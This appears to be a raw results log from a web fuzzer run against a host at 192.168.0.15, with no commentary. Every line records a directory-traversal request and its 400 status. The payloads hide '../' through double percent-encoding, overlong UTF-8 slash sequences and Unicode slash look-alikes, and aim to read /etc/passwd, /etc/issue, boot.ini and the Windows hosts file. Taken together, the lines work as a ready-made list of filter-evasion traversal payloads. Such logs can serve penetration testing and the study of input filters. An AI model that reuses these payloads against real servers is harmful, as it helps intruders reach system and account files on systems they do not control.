515,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afpasswd
518,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afissue
509,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afboot.ini
511,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afpasswd
514,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afissue
513,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afboot.ini
510,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afissue
512,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
508,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
523,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afpasswd
524,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%af%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
525,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%afboot.ini
526,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afissue
527,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%afetc%f8%80%80%80%afpasswd
528,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
529,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini
530,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215issue
531,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215passwd
532,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
533,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini
534,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215issue
535,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215passwd
537,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini
536,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
538,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215issue
540,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
539,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215passwd
542,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215issue
541,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini
543,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215passwd
544,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
545,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215boot.ini
546,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215issue
547,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215etc%u2215passwd
548,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
549,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215boot.ini
550,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215etc%u2215issue
551,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215etc%u2215passwd
552,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
553,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216boot.ini
554,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216issue
562,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216issue
561,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216boot.ini
557,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216boot.ini
555,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216passwd
560,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
556,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
564,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
563,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216passwd
558,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216issue
559,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216%%32%%65%%32%%65%u2216etc%u2216passwd
